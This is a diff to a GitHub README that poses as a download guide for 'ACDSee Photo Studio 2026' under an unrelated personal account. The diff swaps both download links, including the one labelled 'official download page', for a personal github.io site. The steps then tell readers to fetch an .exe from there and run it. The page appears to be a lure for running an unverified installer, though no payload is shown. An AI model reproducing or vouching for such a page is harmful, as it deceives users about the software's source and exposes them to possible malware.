@@ -1,6 +1,6 @@
 # 📸 ACDSee-Photo-Studio-2026 - Manage Your Images With Professional Tools
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Neelmundane892/ACDSee-Photo-Studio-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://neelmundane892.github.io)
 
 ACDSee Photo Studio 2026 offers tools for photographers and casual users to organize, edit, and share images. This software helps you manage large photo collections on Windows 11 and Windows 10. Use this guide to download and install the application on your computer.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these minimum specifications before you begin the ins
 
 Follow these steps to set up the software on your device.
 
-1. Visit the [official download page](https://github.com/Neelmundane892/ACDSee-Photo-Studio-2026) to locate the latest installer file.
+1. Visit the [official download page](https://neelmundane892.github.io) to locate the latest installer file.
 2. Select the download button or the installer link ending in .exe.
 3. Save the file to your computer. Select a location such as your Downloads folder.
 4. Locate the file you just saved. Double-click the installer icon to start the setup process.
